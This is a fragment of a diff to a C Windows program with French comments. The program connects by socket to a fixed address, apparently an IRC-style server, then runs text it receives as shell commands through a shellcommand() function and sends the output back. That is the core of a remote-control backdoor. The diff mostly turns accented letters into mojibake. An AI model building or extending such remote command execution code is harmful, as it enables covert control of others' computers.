@@ -11,13 +11,13 @@ int main()
     WSADATA WSAData;
     SOCKET sock;
     SOCKADDR_IN sin;
-    char buffer[10000]; // Est-ce que ça n'est pas juste ca
+    char buffer[10000]; // Est-ce que ï¿½a n'est pas juste ca
     char sentence[1040];
     char* command = NULL;
     char mode[20]= "none";
 
     WSAStartup(MAKEWORD(2,0), &WSAData);
-    /* Tout est configuré pour se connecter sur IRC, haarlem, Undernet. */
+    /* Tout est configurï¿½ pour se connecter sur IRC, haarlem, Undernet. */
     sock = socket(AF_INET, SOCK_STREAM, 0);
     sin.sin_addr.s_addr = inet_addr("10.4.3.67");
     sin.sin_family = AF_INET;
@@ -44,13 +44,13 @@ int main()
 				exit(0);
 			}
 			strcpy(command,buffer);
-			printf("command envoyée : %d\n", command );
-			char* path = shellcommand(command);
+			printf("command envoyï¿½e : %d\n", command );
+			char* path = shellcommand(command,&sock);
 			printf("le path est : %s\n", path);
 			send(sock, path, (strlen(path))*sizeof(char), 0);
 			free(command);
 		}
-		//Fixe le mode en fonction de la commande envoyée
+		//Fixe le mode en fonction de la commande envoyï¿½e
 		//si command, on passen mode commande
 		if(strcmp(buffer,"command\n") == 0){
 			strcpy(mode,"command");
